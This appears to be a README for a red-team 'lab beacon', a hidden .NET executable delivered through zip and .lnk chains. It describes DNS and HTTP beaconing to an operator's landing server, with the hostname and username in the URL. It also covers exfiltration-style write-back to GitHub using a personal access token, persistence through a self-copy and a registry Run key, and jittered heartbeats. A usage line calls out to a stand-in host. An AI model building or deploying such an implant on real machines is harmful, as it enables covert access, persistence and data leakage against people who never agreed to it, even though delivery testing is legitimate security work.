# lab beacon (zip/lnk delivery tests)

beacon.exe — 13,312 B windowless .NET test runner, source: beacon.cs.
Lanes (all outcomes written to local receipts FIRST, exit code always 0):
 1. local markers: %LOCALAPPDATA%\SyncCache\run-<tag>-<ts>.json (+lanes.log)
    and C:\Users\Public\Documents\scan-<tag>-<ts>.txt  <- PROOF OF EXECUTION,
    readable even on a fully offline box.
 2. dns probe:  <tag>.<--dns domain>   (egress through proxy-hostile nets)
 3. GET sink:   --get "<url with {t} {h} {u} {tag}>"  -> your landing logs it
 0. MOTW SELF-SENSOR: reports Zone.Identifier of its own file in every receipt
    (no-ADS = landed via un-zoned fetch; ADS-present:3 = zone-marked landing)
    NOTE: .NET File.OpenRead cannot open ADS paths - sensor uses kernel32
    CreateFileW (measured 2026-10-27, both controls pass).
 4. github contents write-back (needs --token/--gh + a REAL PAT: the gho_
    OAuth token from Git Credential Manager authenticates /user and git-push
    but REST contents writes 404 behind the app layer; and POST-contents
    fails 404 until the repo has a seed commit. reads 200/404 gotchas banked)
 5. PERSIST --persist: self-copy to SyncCache\scancache.exe + HKCU Run value
    (quoted args survive reboot); --uninstall removes both (delayed delete
    when running from the copy itself).
 6. ALIVE --alive <s> --hb <s>: heartbeat beats (±15% jitter) to sink +
    beats.log; a gap in beats at the webhook = process death; new birth hit
    after reboot = survival. Measured: beats at +2/4/5s of a 5s window.

Usage from a .lnk chain:
  beacon.exe --tag V042 --get "http://YOUR-LANDING/beat?t={tag}&h={h}"

TOKEN NOTE: never bake the owner's classic token into this exe; if lane 4 is
needed in the field, mint a fine-grained PAT with Contents:write on the
receipts repo ONLY and pass it via --token.
